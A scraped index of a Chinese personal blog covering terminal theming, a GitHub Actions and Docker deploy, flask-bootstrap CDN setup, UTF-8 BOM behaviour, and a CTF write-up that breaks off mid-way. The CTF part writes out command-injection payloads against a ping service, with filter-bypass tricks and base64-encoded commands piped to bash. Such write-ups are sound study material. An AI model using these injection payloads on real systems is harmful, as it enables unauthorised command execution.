\u0026#34;manjaro\u0026#34;: \u0026#34;\\uf312\u0026#34;, \u0026#34;mint\u0026#34;: \u0026#34;\\uf30f\u0026#34;, \u0026#34;opensuse\u0026#34;: \u0026#34;\\uf314\u0026#34;, \u0026#34;raspbian\u0026#34;: \u0026#34;\\uf315\u0026#34;, \u0026#34;ubuntu\u0026#34;: \u0026#34;\\uf31c\u0026#34;, \u0026#34;postfix\u0026#34;: \u0026#34; \u0026#34; } }, { \u0026#34;type\u0026#34;: \u0026#34;path\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;powerline\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#b0bec5\u0026#34;, \u0026#34;background\u0026#34;: \u0026#34;#2f2f2f\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;prefix\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;mixed\u0026#34;, \u0026#34;home_icon\u0026#34;: \u0026#34; \\uf015 \u0026#34;, \u0026#34;folder_separator_icon\u0026#34;: \u0026#34;/\u0026#34; } }, { \u0026#34;type\u0026#34;: \u0026#34;git\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;powerline\u0026#34;, \u0026#34;powerline_symbol\u0026#34;: \u0026#34;\\uE0B0\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#193549\u0026#34;, \u0026#34;background\u0026#34;: \u0026#34;#95ffa4\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;display_stash_count\u0026#34;: true, \u0026#34;display_upstream_icon\u0026#34;: true } }, { \u0026#34;type\u0026#34;: \u0026#34;command\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;plain\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#b0bec5\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;shell\u0026#34;: \u0026#34;bash\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;git log --pretty=format:%cr -1 || date +%H:%m:%S\u0026#34; } } ] }, { \u0026#34;type\u0026#34;: \u0026#34;newline\u0026#34; }, { \u0026#34;type\u0026#34;: \u0026#34;prompt\u0026#34;, \u0026#34;alignment\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;segments\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;root\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;plain\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#FF0266\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;prefix\u0026#34;: \u0026#34;\u0026#34; } }, { \u0026#34;type\u0026#34;: \u0026#34;python\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;plain\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#F7CB3F\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;prefix\u0026#34;: \u0026#34;py \u0026#34;, \u0026#34;postfix\u0026#34;: \u0026#34; \u0026#34;, \u0026#34;display_mode\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;display_version\u0026#34;: true } }, { \u0026#34;type\u0026#34;: \u0026#34;exit\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;plain\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#CB4B16\u0026#34; }, { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;plain\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#FF0266\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;prefix\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;\\u09F8\u0026#34; } } ] } ], \u0026#34;final_space\u0026#34;: true } 字体 本人使用的是 JetBrainsMono Nerd Font Mono Regular\n四位数的 unicode emoji 基本支持，五位数的没测过全部\n如果需要使用五位数 unicode，可以去 Surrogate Pair Calculator etc. 转码\n选择提示符 示例采用了 unicode \\u09F8\n可以去 Basic Latin — ✔️ ❤️ ★ Unicode Character Table 寻找自己喜欢的提示符\n分享一些我第一眼比较喜欢的\n1 2 3 4 5 6 7 8 9 10 11 12 13 \\u29F3 形状 \\uA538 \\u09F8 \\u09FB \\u2B9E 右箭头 \\u27A5 \\u25C6 菱形 \\u261B right hand \\u2605 星星 \\u2600 太阳 \\u2BFD male \\u2C96 lambda \\u03BB 换行效果 示例在每行 prompt / 命令 之间加上了自动换行，这样可以使命令看起来不是那么密集\n如果需要移除，请删除第一个 newline block\nCommand 这个 type 是用来执行 shell command，将输出追加到 segment 内\n使用这个功能可以实现很多 DIY 效果\n效果 忘了把 root 的提示符截图进去了，懒得加了\nReferer Docs: https://ohmyposh.dev/docs/configure\nSchema: https://github.com/JanDeDobbeleer/oh-my-posh/blob/main/themes/schema.json\n","date":"2021-04-04T15:01:00+08:00","permalink":"https://blog.tinyume.com/2021/terminal-prettify-guideline/","title":"简易的个性化终端指南"},{"content":" 由于时间间隔较长，并且实际上使用这个方案部署了两天后我就放弃了，所以本人无法保证本文的代码可以正常使用\nPreface 去年年底想着高考完了优化一下博客的访问速度，且由于 Cloudflare + Github Pages 的 Free Server 方案在国内的速度是有所谓极限的，故后来尝试在 Aliyun 国内机上部署，就出现了这套方案。\nTL;DR 本方案使用两个 repo，一个是存放博客源代码的，建议设为私有库，主要做代码管理，这里命名为 source-repo；另一个存放生成的静态文件，也就是 gh-pages 库，这里命名为 public-repo。\n第一个 Actions 主要的事务 根据 source-repo 的源代码构建静态网页文件 将 Dockerfile、cert(optional not recommended) 放到网站根目录 将第二个 Actions 放到 .github/workflows 第二个 Actions 主要的事务 根据根目录构建一个 Apache Docker 将构建好的镜像推送到阿里镜像仓库 连接待部署的服务器并拉取镜像运行 tips: 由于双 Actions 方案稍微复杂，并不适合初入 Actions 的人，所以此处不再复述 repo、aliyun server、docker account 的访问和配置。\nCode Actions 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 name: Push CI on: [push] jobs: build: runs-on: ubuntu-latest strategy: matrix: node-version: [10.x] steps: - uses: actions/checkout@master - name: Use Node.js ${{ matrix.node-version }} uses: actions/setup-node@v1 with: node-version: ${{ matrix.node-version }} - name: Environment Setup env: id_rsa: ${{ secrets.BLOG_ACTIONS_PRI }} run: | mkdir -p ~/.ssh/ echo \u0026#34;$id_rsa\u0026#34; \u0026gt; ~/.ssh/id_rsa chmod 600 ~/.ssh/id_rsa ssh-keyscan github.com \u0026gt;\u0026gt; ~/.ssh/known_hosts git config --global user.name \u0026#39;iyume\u0026#39; git config --global user.email \u0026#39;iyumelive@gmail.com\u0026#39; - name: Install Dependencies run: | npm i -g hexo-cli npm i - name: Generate Public run: | gulp default - name: First-Step Deployer run: | cd public mkdir -p .github/workflows cp ../two_step_deploy/actions.yml .github/workflows/actions.yml cp ../two_step_deploy/Dockerfile Dockerfile cp ../two_step_deploy/.dockerignore .dockerignore cp ../two_step_deploy/httpd.conf httpd.conf cp ../two_step_deploy/httpd-vhosts.conf httpd-vhosts.conf # cp ../two_step_deploy/cert cert -r git init git remote add origin git@github.com:iyume/hexo-blog.git git commit --allow-empty -n -m \u0026#34;Initial commit\u0026#34; git add . git commit -m \u0026#34;[Force Updated] Actions ID $GITHUB_RUN_NUMBER\u0026#34; git push origin master -f git branch gh-pages git checkout gh-pages git merge master git reset HEAD^ git add . git rm --cached -r .github git commit -m \u0026#34;[Site Updated] Force Actions ID $GITHUB_RUN_NUMBER\u0026#34; git push origin gh-pages -f - name: Second-Step Deployer run: | echo \u0026#34;Second-Step is deployed by repo hexo-blog\u0026#34; Actions 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 name: Docker Build and Push on: [push] jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@master - name: Build and Push env: registry: ${{ secrets.REGISTRY }} username: ${{ secrets.USERNAME }} password: ${{ secrets.PASSWORD }} run: | docker login --username $username --password $password registry.cn-hongkong.aliyuncs.com docker build -t $registry:$GITHUB_RUN_NUMBER . docker push $registry:$GITHUB_RUN_NUMBER docker tag $registry:$GITHUB_RUN_NUMBER $registry:latest docker push $registry:latest - name: Pull and Deploy uses: appleboy/ssh-action@master env: registry: ${{ secrets.REGISTRY }} # can not be used as no-string repo_username: ${{ secrets.USERNAME }} repo_password: ${{ secrets.PASSWORD }} with: host: ${{ secrets.HOST_IP }} username: ${{ secrets.HOST_USERNAME }} password: ${{ secrets.HOST_PASSWORD }} port: 22 envs: registry, repo_username, repo_password script: | docker stop myblog || true docker rm myblog || true docker rmi ${{ secrets.REGISTRY }}:latest || true docker login --username \u0026#34;$repo_username\u0026#34; --password \u0026#34;$repo_password\u0026#34; registry.cn-hongkong.aliyuncs.com docker pull ${{ secrets.REGISTRY }}:latest docker run -d --name myblog -p 80:80 -p 443:443 ${{ secrets.REGISTRY }}:latest Dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 FROM httpd WORKDIR /usr/local/apache2 RUN rm -rf htdocs/* COPY . htdocs/ RUN rm conf/extra/httpd-vhosts.conf \u0026amp;\u0026amp; mv htdocs/httpd-vhosts.conf conf/extra/httpd-vhosts.conf RUN rm conf/httpd.conf \u0026amp;\u0026amp; mv htdocs/httpd.conf conf/httpd.conf # RUN mkdir cert # COPY cert/* cert/ EXPOSE 80 EXPOSE 443 ","date":"2021-03-26T18:49:00+08:00","permalink":"https://blog.tinyume.com/2021/2020-blog-actions-docker-deploy/","title":"博客自动化部署-2020"},{"content":"第一件事\n今年不同往常，大学从 1.3 就开始了时长两个月的寒假，并且由于疫情原因也不知道会不会又像去年那样展开网课。并且从去年 12 月中旬开始，从我被老师推荐到一个公司做网站的时候，应该就稍微忙了起来。但其实好像也不是那么忙，因为这个项目并不是那么难写，老师也没要求移动端适配（我不擅长的地方）\n网站计划其实也可以讲讲，初始计划是拿 tailwindcss + fastapi + flask 完成前后端分离设计的。写了一会后发现 flask 根本没有存在的必要\u0026hellip;就拿 fastapi 把前端重写了一遍。\n这应该算是本人的第一桶金，后面会写篇比较详细的有关的文章。同时这也是本人第一次接手算得上是大型的项目，也有相应的报酬，于是打算回学校把笔记本给换了。\n第二件事\n由于某些原因，本人较为迫切需要一个 Arcaea 的查分机器人。于是花了接近一星期的时间完成了一个 QQbot。在这一个星期前我完全没接触过 QQbot 的编写。\n主要成果有 消息交互式 Python 解释器 和 Arcaea 查分器 这两个针对 nonebot2 开发的插件。目前已发布到插件广场。\n第三件事\n和朋友出去打街机，然后过新年。\n接下来是对迟来的年度总结的解释\n这次年度总结不同寻常的地方是 1.我高中毕业了 2.我满十八了\n所以这次年度总结会有较长的篇幅是不可避免的，只是目前处于不是很方便写年度总结的处境。我的预测是如果三月正常开学，那么我三月中旬应该就可以完成年度总结的编写。\n","date":"2021-02-14T00:35:19+08:00","permalink":"https://blog.tinyume.com/2021/2021-new-year-matters/","title":"新年近况"},{"content":"起因是在双十一抽到了 1111 大红包，原价 2999 实付款 1877，原本想等后面一点再买的，既然抽到红包，那就直接入手了。\niPad 8 是在 2020 年 9 月 15 日线上发布的，性价比方面比 iPad 7 高了不少，又正好卡在双十一之前了，只能说是碰巧。\nBrand: iPad 8\nCPU: A12 Bionic\nOS: iPad OS 14\nApperence: Space Gray\nROM: 128G\n至于渠道，是从淘宝买的，店家我就不说了，看了几百条评论后才下手买的。有人说是官换机，但也没人证实，实际用起来也没什么差别。序列号是正确的，激活后也显示了保修到期日为 2021/11/14\n从淘宝买的原因有两个，一是支付宝红包好像不能在 Apple 官网付（虽然淘宝也有旗舰店），二是这个商家送了很多东西，主要包括\n蓝牙键盘（非常方便） 保护套 触控笔 高清膜 耳机（实测一般） 相比旗舰店购买的裸机还是好了许多的，我也并不是非得从官网入手才能用的那种人\n见下图\n买回来就随便看了看，然后就开始下载 Arcaea 了，也没去整什么爱思助手，感觉没什么必要，毕竟对我来说评测最好的方法还是玩音游，我个人对延迟比较敏感，可能多个 10ms 少个 10ms 都可以感觉出来。\n第一次拿平板打音游，体验感真的起飞了~\n可能有人不知道我是个音游爱好者，个人 Arcaea 时长以及达到了 200h，ptt 10.72，也算 1/4 个音游大佬了？hh\n虽然平时也喜欢打街机，但还是 Arc 最喜欢了，Cytus 什么的早就被我堆到墙角去了ww\n","date":"2020-12-11T19:36:00+08:00","permalink":"https://blog.tinyume.com/2020/ipad8-unbox/","title":"iPad 8 开箱"},{"content":" @@ 2020-12-14 @@\nPreface flask-bootstrap 是用于 flask 框架中一个 pip 包，通过 jinja2 模板继承特性可以快速开发 bootstrap。\n但这个包默认采用的是 cloudflare 源，默认会包含 bootstrap.css、bootstrap.js、jquery.js，此外还可以包含 html5shiv、respond.js，这个可以通过一定方法查看，比如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 In [1]: from flask import Flask In [2]: from flask_bootstrap import Bootstrap In [3]: app = Flask(__name__) In [4]: bootstrap = Bootstrap(app) In [5]: app.extensions Out[5]: {\u0026#39;bootstrap\u0026#39;: {\u0026#39;cdns\u0026#39;: {\u0026#39;local\u0026#39;: \u0026lt;flask_bootstrap.StaticCDN at 0x743831b0\u0026gt;, \u0026#39;static\u0026#39;: \u0026lt;flask_bootstrap.StaticCDN at 0x743b9e50\u0026gt;, \u0026#39;bootstrap\u0026#39;: \u0026lt;flask_bootstrap.ConditionalCDN at 0x743a4fb0\u0026gt;, \u0026#39;jquery\u0026#39;: \u0026lt;flask_bootstrap.ConditionalCDN at 0x743dd550\u0026gt;, \u0026#39;html5shiv\u0026#39;: \u0026lt;flask_bootstrap.ConditionalCDN at 0x743cf3d0\u0026gt;, \u0026#39;respond.js\u0026#39;: \u0026lt;flask_bootstrap.ConditionalCDN at 0x743cf5d0\u0026gt;, \u0026#39;bootcdn_bootstrap\u0026#39;: \u0026lt;flask_bootstrap.ConditionalCDN at 0x743cf0f0\u0026gt;, \u0026#39;bootcdn_jquery\u0026#39;: \u0026lt;flask_bootstrap.ConditionalCDN at 0x743cf4b0\u0026gt;}}, \u0026#39;nav_renderers\u0026#39;: {\u0026#39;bootstrap\u0026#39;: (\u0026#39;flask_bootstrap.nav\u0026#39;, \u0026#39;BootstrapRenderer\u0026#39;), None: (\u0026#39;flask_bootstrap.nav\u0026#39;, \u0026#39;BootstrapRenderer\u0026#39;)}} 但是在国内，cloudflare 的速度真是令人感动。\n纵观一圈网上的解决方法，总体来说分两种思路：(1) 在 __init__.py 暴力修改 (2) 修改 flask-bootstrap package\n第一种方法代码量较大，并且暴力修改代码使其可读性大大降低；第二种方法在环境变了或者包更新了的情况都需要重新配置，太麻烦了。\nInplement 一个包的主体部分是不会变的，那么我们在项目主入口用类继承重写一下方法就行了，并且在模板继承时重写 bootstrap/base.html 中的 styles 和 scripts\nRecette 这里采用 bootcdn 作范例\n首先要读源码，了解 flask-bootstrap 这个包怎么运行，我就不写怎么读了（\n包目录\n~/venv/lib/python3.x/site-packages/flask_bootstrap\n我们知道 Python 在 import flask-bootstrap 时，其实就是 import 了这个目录下的__init__.py再通过对象方法调用相应的类，from flask-bootstrap import Bootstrap 就是直接导入了 Bootstrap 这个类\n我们需要用到__init__.py中以下类/包变量\nBootstrap, ConditionalCDN, WebCDN, StaticCDN, BOOTSTRAP_VERSION, JQUERY_VERSION\nInitialization 1 2 from flask import Flask from flask_bootstrap import Bootstrap, ConditionalCDN, WebCDN, StaticCDN, BOOTSTRAP_VERSION, JQUERY_VERSION Rewrite inherited class function 1 2 3 4 5 6 7 8 9 10 11 class Bootstrap_with_bootcdn(Bootstrap): # 子类 def init_app(self, app): # 重写 super().init_app(app) # 继承 local = StaticCDN(\u0026#39;bootstrap.static\u0026#39;, rev=True) static = StaticCDN() def lwrap(cdn, primary=static): return ConditionalCDN(\u0026#39;BOOTSTRAP_SERVE_LOCAL\u0026#39;, primary, cdn) bootcdn_bootstrap = lwrap(WebCDN(\u0026#39;//cdn.bootcdn.net/ajax/libs/twitter-bootstrap/%s/\u0026#39; % BOOTSTRAP_VERSION), local) bootcdn_jquery = lwrap(WebCDN(\u0026#39;//cdn.bootcdn.net/ajax/libs/jquery/%s/\u0026#39; % JQUERY_VERSION), local) app.extensions[\u0026#39;bootstrap\u0026#39;][\u0026#39;cdns\u0026#39;][\u0026#39;bootcdn_bootstrap\u0026#39;] = bootcdn_bootstrap app.extensions[\u0026#39;bootstrap\u0026#39;][\u0026#39;cdns\u0026#39;][\u0026#39;bootcdn_jquery\u0026#39;] = bootcdn_jquery 我在此处加入了两条键，分别是bootcdn_bootstrap和bootcdn_jquery，在后面模板重写需要用到\n如果你想加入别的 CDN，只需要按照上面的规则添加就行了\n再将其实例化\n1 2 app = Flask(__name__) bootstrap = Bootstrap_with_bootcdn(app) Rewrite inherited template block 1 2 3 4 5 6 7 8 {% block styles %} \u0026lt;link href=\u0026#34;{{ bootstrap_find_resource(\u0026#39;css/bootstrap.css\u0026#39;, cdn=\u0026#39;bootcdn_bootstrap\u0026#39;) }}\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; {% endblock %} {% block scripts %} \u0026lt;script src=\u0026#34;{{ bootstrap_find_resource(\u0026#39;jquery.js\u0026#39;, cdn=\u0026#39;bootcdn_jquery\u0026#39;) }}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;{{ bootstrap_find_resource(\u0026#39;js/bootstrap.js\u0026#39;, cdn=\u0026#39;bootcdn_bootstrap\u0026#39;) }}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; {% endblock %} 我们知道 super() 是类继承用的函数，但是这在模板继承也可以用到，并且具有非常类似的作用，如果不在 block 中加入 super()，会默认使用子模板的同名 block 覆盖父模板中的同名 block\n这里的 bootstrap_find_resource 方法中的属性 cdn 要对应我们之前重写的类属性\nOthers - Optimization 我们可以将以上代码打包放进config.py，这是我比较推荐的一种方式\n./config.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from flask_bootstrap import Bootstrap, ConditionalCDN, WebCDN, StaticCDN, BOOTSTRAP_VERSION, JQUERY_VERSION class Bootstrap_with_bootcdn(Bootstrap): def init_app(self, app): super().init_app(app) local = StaticCDN(\u0026#39;bootstrap.static\u0026#39;, rev=True) static = StaticCDN() def lwrap(cdn, primary=static): return ConditionalCDN(\u0026#39;BOOTSTRAP_SERVE_LOCAL\u0026#39;, primary, cdn) bootcdn_bootstrap = lwrap(WebCDN(\u0026#39;//cdn.bootcdn.net/ajax/libs/twitter-bootstrap/%s/\u0026#39; % BOOTSTRAP_VERSION), loca l) bootcdn_jquery = lwrap(WebCDN(\u0026#39;//cdn.bootcdn.net/ajax/libs/jquery/%s/\u0026#39; % JQUERY_VERSION), local) app.extensions[\u0026#39;bootstrap\u0026#39;][\u0026#39;cdns\u0026#39;][\u0026#39;bootcdn_bootstrap\u0026#39;] = bootcdn_bootstrap app.extensions[\u0026#39;bootstrap\u0026#39;][\u0026#39;cdns\u0026#39;][\u0026#39;bootcdn_jquery\u0026#39;] = bootcdn_jquery ./app.py\n1 2 3 4 from config import Bootstrap_with_bootcdn app = Flask(__name__) bootstrap = Bootstrap_with_bootcdn(app) ","date":"2020-12-11T16:21:00+08:00","permalink":"https://blog.tinyume.com/2020/flask-configure-bootstrap-mirror/","title":"flask-bootstrap 优雅配置国内加速源"},{"content":"原本只是无意间发现 https://github.com/luhuisicnu/The-Flask-Mega-Tutorial-zh 这个项目，想拷到本地查看（毕竟 Gitbook 的速度也是挺不理想）\n之前虽然有过类似的操作，当时是用 gitbook serve 实现在本地浏览器查看，不过这样的操作未免过于繁琐。于是这次便想着配合 wsl apache + markdown viewer 来简化操作流程\n当我部署完成访问SUMMARY.md时，却出现了中文乱码，再点开浏览器编码，发现浏览器自动使用了西文编码而不是UTF-8\n想到我之前参赛中遇到的一些小问题，结合起来写出了这篇关于 Unicode 各种文件头中的介绍文章，以及一些个人的猜测\n先讲讲utf-8和utf-8 with bom BOM（Byte Order Mark），字节顺序标记，出现在文本文件头部，Unicode编码标准中用于标识文件是采用哪种格式的编码。\n\u0026mdash;-百度百科\n建立 abc.txt 用utf-8保存 建立 abd.txt 用utf-8 with bom保存\n如果你有 VSCode，那么打开文件在右下角便可以看见一个UTF-8标识，点开再通过编码保存就行了\n并给两个文件写入相同内容\n再使用 010 Editor 分别打开两个文件\n我们知道utf-8是无字节序的，没有所谓文件头 而 UTF-8 with BOM 文件头多出来了EF BB BF\n相关网站：https://developer.ibm.com/zh/articles/unicode-programming-language/\n可以得知虽然 BOM 的意思是字节顺序标记，但在 UTF-8 编码格式的文本中，如果添加了 BOM，则标示该文本是由 UTF-8 编码方式编码的，而不用来说明字节序\nPython 处理utf-8 with bom 之前在比赛中使用burp爆破时，总会发现字典的第一个密码在burp中会显示成乱码\n先试着打开一下第一行会乱码的那个文件\n1 2 3 with open(\u0026#39;./password.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: t = f.read() print(t.split(\u0026#39;\\n\u0026#39;)) 第一行是\\ufeffadmin，多了个奇怪的东西\\ufeff\n并且这个东西可以通过如下语句去掉，只是换了个编码方式\n1 2 3 with open(\u0026#39;./password.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8-sig\u0026#39;) as f: t = f.read() print(t.split(\u0026#39;\\n\u0026#39;)) 我们知道\\u就是表示unicode，那么\\ufeff是什么呢？\n尝试以下代码\n1 2 3 4 \u0026#39;i like milk\u0026#39;.encode(\u0026#39;utf-8-sig\u0026#39;) # output: b\u0026#39;\\xef\\xbb\\xbfi like milk\u0026#39; \u0026#39;i like milk\u0026#39;.encode(\u0026#39;utf-8-sig\u0026#39;).decode(\u0026#39;utf-8\u0026#39;) # output: \u0026#39;\\ufeffi like milk\u0026#39; 第一行中出现了\\xef\\xbb\\xbf，\\x是表示十六进制的，并且EF BB BF正好就是 UTF-8 with bom 的文件头部\n在第二行中使用utf-8-sig编码再使用utf-8解码便出现了\\ufeff这个玩意\n可以推测\\ufeff就是之前提到的多出的三个十六进制符EF BB BF在decode('utf-8')时被错误识别而编码出来的部分\n并且通过查阅资料，可以发现FE FF是 UTF-16-BE 的 BOM\n但是也有许多讲不通的地方，于是去查了谷歌发现这样一句话\nOur friend FEFF means different things, but it\u0026rsquo;s basically a signal for a program on how to read the text. It can be UTF-8 (more common), UTF-16 , or even UTF-32 . FEFF itself is for UTF-16 — in UTF-8 it is more commonly known as 0xEF,0xBB, or 0xBF\n个人翻译：FEFF 可以代表不同的东西，但它基本上是一个程序阅读一个文本的信号。它可以意味着 UTF-8（更常见），UTF-16，甚至是 UTF-32。FEFF 自身是属于 UTF-16，在 UTF-8 中它通常被称为 0xEF, 0xBB, 0xBF\n于是我有个了更大胆的猜测：因为 UTF-8 无字节序，它并不知道面对的文件编码到底是哪种，所以我们平时保存所谓的 UTF-8，实际上会以 UTF-16 读取！\n说那么多，不如来动手试试！\n先把abc.txt用 UTF-16-BE 储存\n1 2 3 4 with open(\u0026#39;./abc.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-16-be\u0026#39;) as f: t = f.read() print(t) # output: \u0026#39;\\ufeffadddd这是中文\\n\\nand this is milk.\\n\u0026#39; 出现了熟悉的\\ufeff！\n与 UTF-8 相同的是，UTF-16-BE 和 UTF-16-LE 也可以不需要 BOM（也许都不需要，但若是如此则需要自己判断类型）\n并且还发现了一个出乎意料并且有意思的东西\n1 2 3 4 5 6 \u0026#39;abc\u0026#39;.encode(\u0026#39;utf-16\u0026#39;) # output: b\u0026#39;\\xff\\xfea\\x00b\\x00c\\x00\u0026#39; \u0026#39;abc\u0026#39;.encode(\u0026#39;utf-16\u0026#39;).decode(\u0026#39;utf-16-le\u0026#39;) # output: \u0026#39;\\ufeffabc\u0026#39; \u0026#39;abc\u0026#39;.encode(\u0026#39;utf-16\u0026#39;).decode(\u0026#39;utf-16-be\u0026#39;) # output: \u0026#39;\\ufffe愀戀挀\u0026#39; 以上代码使用utf-16编码出来的头为\\xff\\xfe，而在使用utf-16-le解码却出现了\\ufeff，可能的推测就是utf-16-le对utf-16编码的字符的处理相对于utf-16-be是对每两个十六进制数交换了一下位置\n还有处地方很神奇了，此前我一直以为 UTF-16 decode 和 UTF-16-LE decode 是一样的效果，在这里居然多了个\\ufeff，略微试试才发现utf-16 encode和utf-16-le encode是不一样的，并且utf-16-le decode不会处理\\xff\\xfe\n但是以下代码却出乎我的意料\n1 2 \u0026#39;\\xef\\xbb\\xbf\u0026#39;.encode(\u0026#39;utf-16\u0026#39;).decode(\u0026#39;utf-16\u0026#39;) output: \u0026#39;ï»¿\u0026#39; 很多人可能不知道ï»¿是什么符号，但我曾经在burp见过\n它就是在某些软件中载入utf-8 with bom文件时，首行被错误识别的字符！\n再尝试\n1 2 \u0026#39;\\xef\\xbb\\xbf\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) \u0026#39;ï»¿\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) 它们的输出都是\n1 b\u0026#39;\\xc3\\xaf\\xc2\\xbb\\xc2\\xbf\u0026#39; ï»¿的十进制为 239 187 191，它实际上就对应EF BB BF，只不过 UTF-8 错误地将它当成字符解释了出来\n综上我们可以得出以下三点结论 UTF-8 的 BOM 会被识别它自身识别成ï»¿（这并不是乱码）\n对EF BB BF的编码有如下特征\n直接使用 UTF-8 decode，它会变成\\ufeff\n先执行 UTF-8 encode，再执行 UTF-8 decode，它会变成ï»¿\n先执行 UTF-16 encode，再执行 UTF-16 decode，它会变成ï»¿\n先执行 UTF-16 encode，再执行 UTF-16-LE decode，他会变成\\ufeffï»¿（最奇怪的地方）\n\\ufeff会在以下情况出现\nb'\\xef\\xbb\\xbf'.decode('utf-8')\n''.encode('utf-8-sig').decode('utf-8')\n''.encode('utf-16').decode('utf-16-le')\n注意点：\nutf-16 encode会给加上头部\\xff\\xfe\n而utf-16-le encode和utf-16-be encode并不会\n并且utf-16-le decode和utf-16-be decode不会处理来自utf-16 encode加上的文件头\n我对此的猜测 回归原题目：为什么读取 utf-8 with bom 的文件首行会出现\\ufeff？并且某些软件会出现ï»¿？\n第一种\n可能是编程软件中的utf-8处理带 BOM 编码文件时，有一种特殊的兼容性处理方式，就是在 BOM 之后的每一位十六进制符往后填充\\x00，首部填充了\\xff\\xfe，将其转换为标准utf-16编码，再使用utf-16-le decode，而 BOM 的EF BB BF由于仅代表 Zero Width No-Break Space，可能存在某种特殊机制使其在utf-16 encode之前就变成了空字符，而utf-16 encode所加上的文件头\\xff\\xfe在utf-16-le decode后就变成了\\xfe\\xff，但这种可能也无法解释为什么utf-8 without bom编码文件在解码时不会被加上\\ufeff\n可能\\xef\\xbb\\xbf执行utf-8 decode就是\\ufeff，但会有很多地方解释不清\n第二种\n可能是某些软件读取文件时，直接对十六进制内容进行utf-8 decode（或是utf-16 decode），导致 BOM 被当作文件一部分解释了出来，进而出现了ï»¿ 注意 我本人不是很熟悉编码方面的原理，一切仅是推理\n本文章也算是一个抛砖引玉吧，毕竟这一块找了挺多资料都没有很详细的记载\n说了那么多额外话题，最初的浏览器中文乱码问题的解决方法其实就是在markdown viewer设置中添加一项http://localhost match all 并且开启 encoding utf-8 就行了\n限于时间，我没空再进行别的实验了，比如说添加响应头来看看浏览器会不会识别，实际上写这一篇文章已经耗了一个晚上\n小结一下就是：\n编程语言及各类常用应用中，使用 UTF-8 编码的文件可以被正常读取，而浏览器不行\n使用 UTF-8 with BOM 可以正常被浏览器读取，而在大多数编程语言中需要进行额外处理，并且有一小部分软件无法识别 BOM（比如burp）\n","date":"2020-12-08T15:52:00+08:00","permalink":"https://blog.tinyume.com/2020/bom-introduction/","title":"BOM、UTF-8 和浏览器编码问题"},{"content":"祥云杯 比赛时间：2020.11.21 9:00 - 2020.11.22 21:00\n比赛形式：CTF\n签到题 ZmxhZ3txcV9ncm91cF84MjY1NjYwNDB9\n目测base64加密，解密得到flag\n还是原来的 Ping ？ 网上稍微查查可以发现ping的命令绕过，这就是个命令绕过题\n先试试输入127.0.0.1|ls\n有回显\n接着试错过滤字符，\u0026lt;space\u0026gt;、\u0026amp;、\u0026gt;、cat、'、flag等等被过滤了，但是\u0026quot;、%、\\并没有被过滤\n那就构造127.0.0.1|ca\u0026quot;t\u0026quot;\u0026lt;./sou.js\n有回显\n接下来需要寻找flag，基本命令就是\n1 find / -name \u0026#34;*flag*\u0026#34; 空格可以用%09进行绕过（{}也被过滤了，无法使用{IFS}），比较难解决的就是flag了，在flag掺杂\u0026quot;、/、\\均无法绕过，看来不是单纯的字符检测，那就使用base64试试\n将上面的基本命令用base64加密得ZmluZCAvIC1uYW1lICIqZmxhZyoi\n构造如下payload进行尝试\n1 127.0.0.1|echo%09ZmluZCAvIC1uYW1lICIqZmxhZyoi|base64%09-d|bas\\h 基本原理就是利用管道符|将echo命令的值传给base64命令，base64对base64内容解密并传给bash命令\n可以说我就是在这里卡住了，因为没有任何输出信息\n后来朋友提示了我说把payload放到url输入试试，结果惊奇发现有了回显，才反应过来浏览器自动对特殊字符进行了url编码，而linux并不会自动将%25自动替换成%或者将%7C自动替换成|之类的，这就导致了无回显\n回显如下（我手动对齐了一下）\n1 2 3 4 5 6 7 8 9 10 11 12 Result:/sys/devices/platform/serial8250/tty/ttyS0/flags /sys/devices/platform/serial8250/tty/ttyS1/flags /sys/devices/pci0000:00/0000:00:03.0/virtio0/net/eth0/flags /sys/devices/virtual/net/lo/flags /sys/devices/virtual/net/dummy0/flags /sys/module/scsi_mod/parameters/default_dev_flags 